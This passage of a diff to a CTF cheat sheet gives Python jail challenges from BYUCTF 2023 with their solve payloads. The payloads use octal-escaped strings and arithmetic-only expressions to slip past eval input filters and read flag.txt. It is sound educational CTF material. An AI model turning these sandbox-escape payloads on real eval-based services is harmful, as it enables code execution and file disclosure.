_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_][[]==[]]*~_
-```
-
 ### BYUCTF 2023: Leet 2
+
 - `leet2.py`
+
 ```py
 import re
 FLAG = open('flag.txt').read()
@@ -1818,34 +1977,45 @@ if re.search(r'[123456789]', inp) or re.search(r'\(', inp) or eval(inp) != 1337:
 else:
     print(FLAG)
 ```
+
 - `solve.py`
+
 ```py
 [_:=[]>[],~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_][[]==[]]*~_
 ```
 
 ### BYUCTF 2023: abcdefghijklm
+
 - `abcdefghijklm.py`
+
 ```py
 inp = input("code > ").lower()
 eval((inp[:4]+__import__("re").sub(r'[a-m]','',inp[4:]))[:80])
 ```
+
 - `solve.py`
+
 ```py
 eval("op\\145n(*op\\145n('/\\146\\154\\141\\147.txt'))")
 ```
 
 ### BYUCTF 2023: nopqrstuvwxyz
+
 - `nopqrstuvwxyz.py`
+
 ```py
 inp = input("code > ").lower()
 eval((inp[:4]+__import__("re").sub(r'[n-z]','',inp[4:]))[:80])
 ```
+
 - `solve.py`
+
 ```py
 eval("\\157\\160e\\156(*\\157\\160e\\156('/flag.\\164\\170\\164'))")
 ```
 
 ## References
+
 - https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes
 - https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md
 - https://jbnrz.com.cn/index.php/2024/05/19/pyjail/
